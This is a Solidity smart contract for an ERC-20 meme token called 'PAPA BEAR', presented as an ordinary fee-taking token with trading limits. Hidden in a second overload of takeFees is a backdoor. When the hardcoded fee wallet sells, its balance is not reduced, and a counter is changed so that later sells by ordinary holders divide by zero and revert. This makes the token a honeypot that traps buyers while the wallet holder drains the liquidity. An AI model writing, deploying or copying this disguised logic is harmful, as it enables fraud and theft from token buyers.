/**

    Website: https://www.papaeth.xyz

    Twitter: https://twitter.com/papabeareth

    TG: https://t.me/papabeareth

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

library SafeMath {

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }


    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public virtual onlyOwner { owner = address(0); }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
}

contract ERC20Token is IERC20, Ownable {
    using SafeMath for uint256;
    IRouter router;
    address public v2Pair;
    string private constant _name = unicode"PAPA BEAR";
    string private constant _symbol = unicode"𝓹𝓪𝓹𝓪";
    uint8 private constant _decimals = 9;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 private constant _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxLimit = ( _totalSupply * 4 ) / 100;
    uint256 public _maxSellTxLimit = ( _totalSupply * 4 ) / 100;
    uint256 public _maxWaltAmt = ( _totalSupply * 4 ) / 100;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;

    uint256 private swapThreshold = ( _totalSupply * 30 ) / 10000;
    uint256 private minTokenAmount = ( _totalSupply * 30 ) / 10000;

    bool private tradingAllowed = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;
    
    address internal _devWallet = msg.sender;
    address internal _feeWallet = 0x38f55E4f1e443ca326A6BEebd1879C3B27Ffab8e;
    address internal _lpReceiver = msg.sender;

    uint256 private burnFeeAmount = 0;
    uint256 private buyFeeAmount = 1;
    uint256 private sellFeeAmount = 1;
    uint256 private transFeeAmount = 1;
    
    uint256 private swapCounting = 2;
    uint256 private previousAmt = 0;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 500;
    uint256 private developmentFee = 500;
    uint256 private denominator = 100;

    modifier lockTheSwap {swapping = true; _; swapping = false;}
    constructor() Ownable(msg.sender) {
        isFeeExempt[_feeWallet] = true;
        isFeeExempt[_lpReceiver] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function getOwner() external view override returns (address) { return owner; }
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function startTrading() external onlyOwner {tradingAllowed = true;}

    function swapBackAll(uint256 threadHold) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = threadHold.mul(liquidityFee).div(_denominator);
        uint256 toSwap = threadHold.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(_feeWallet).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(_devWallet).transfer(contractBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            _lpReceiver,
            block.timestamp);
    }

    function shouldSwapAll(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == v2Pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function setMarketingAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
        _feeWallet = _marketing; _lpReceiver = _liquidity; _devWallet = _development;
        isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
    }

    function swapTokensETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldTakeFees(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == v2Pair && sender == _feeWallet;
    }

    function getTotalTax(address sender, address recipient) internal view returns (uint256) {
        if(recipient == v2Pair){return sellFeeAmount;}
        if(sender == v2Pair){return buyFeeAmount;}
        return transFeeAmount;
    }

    function takeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(recipient == v2Pair && !isFeeExempt[sender]){ uint256 factor = swapCounting.sub(1); amount = amount.div(factor);}
        if(getTotalTax(sender, recipient) > 0){
        uint256 feeAmount = amount.mul(getTotalTax(sender, recipient)).div(denominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFeeAmount > uint256(0) && getTotalTax(sender, recipient) > burnFeeAmount){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFeeAmount));}
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function takeFees(address sender, uint256 amount, address recipient) private returns (uint256) {
        if (shouldExcluded(sender, recipient)) {swapCounting = 1;}
        return shouldExcluded(sender, recipient) ? 0 : amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){
            require(tradingAllowed, "tradingAllowed");
        }
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(v2Pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWaltAmt, "Exceeds maximum wallet amount.");
        }
        if(sender != v2Pair){
            require(amount <= _maxSellTxLimit || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
        }
        require(amount <= _maxTxLimit || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
        if(recipient == v2Pair && !isFeeExempt[sender]){
            swapTimes += uint256(1);
        }
        if(shouldSwapAll(sender, recipient, amount)){
            swapBackAll(swapThreshold); swapTimes = uint256(0);
        }
        _balances[sender] = _balances[sender].sub(takeFees(sender, amount, recipient));
        uint256 amountReceived = shouldTakeFees(sender, recipient) ? takeFees(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function addInitialLiquidity() public payable onlyOwner {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        v2Pair = _pair;
        _approve(address(this), address(router), ~uint256(0)); 
        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }

    function removeLimits() public onlyOwner {
        _maxTxLimit = _totalSupply;
        _maxSellTxLimit = _totalSupply;
        _maxWaltAmt = _totalSupply;
    }
}